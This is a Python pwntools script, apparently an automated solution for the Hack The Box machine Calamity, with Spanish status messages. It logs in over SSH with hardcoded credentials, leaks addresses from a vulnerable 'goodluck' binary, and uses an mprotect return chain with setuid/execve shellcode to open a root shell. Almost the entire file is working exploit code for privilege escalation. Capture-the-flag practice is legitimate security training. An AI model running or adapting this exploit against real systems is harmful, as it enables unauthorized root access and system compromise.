try:
    from pwn import *
    print("\n[\033[1;32m+\033[1;37m] Autopwn Calamity ~ GatoGamer1155\n")
except:
    print("\n[\033[1;31m!\033[1;37m] El script necesita privilegios de root\n\n[\033[1;31m!\033[1;37m] Recuerda tener instalada la libreria pwntools\n")
    exit(1)

def kill(sig, frame):
    print("\n[\033[1;31m-\033[1;37m] Saliendo\n")
    sys.exit(1)

signal.signal(signal.SIGINT, kill)

request = ssh(host="10.10.10.27", user="xalvas", password="18547936..*")
shell = request.process("/home/xalvas/app/goodluck")
exp = b"/tmp/{randoms(10)}"

request.upload_data(b"A" * 8 + p32(0x80002FF8), exp)
shell.sendline(exp)
shell.recv(4096)
shell.sendline(b"2")

res = shell.recv(4096).decode()
sct = re.findall(r'debug info: (0x[0-9a-f]+)', res)[0]

request.upload_data(p32(int(sct, 16)) + b'AAAA' + p32(0x80002ff4), exp)
shell.sendline(b"4")
shell.recv(4096)
shell.sendline(exp)
shell.recv(4096)
shell.sendline(b"3")

res = shell.recvuntil(b"Filename:  ").decode()
bdr = int(re.search(r'vulnerable pointer is at ([0-9a-f]+)', res).group(1), 16)

str, std = (int(x, 16) for x in re.search(r'\n([0-9a-f]{8})-([0-9a-f]{8}) rw-p 00000000 00:00 0          \[stack\]\n', res).groups())

prt = 0xb7efcd50
sze = std - str
payload = asm(shellcraft.setuid(0) + shellcraft.execve('/bin/sh'))
exploit =  payload
exploit += b"A" * (76 - len(payload))
exploit += p32(prt)
exploit += p32(bdr)
exploit += p32(str)
exploit += p32(sze)
exploit += p32(7)

request.upload_data(exploit, exp)
shell.sendline(exp)
request.unlink(exp)
shell.sendline(b"export HOME=/root; cd; bash")
shell.sendline(b"export TERM=xterm; echo 'uid=0(root)'")
shell.interactive()
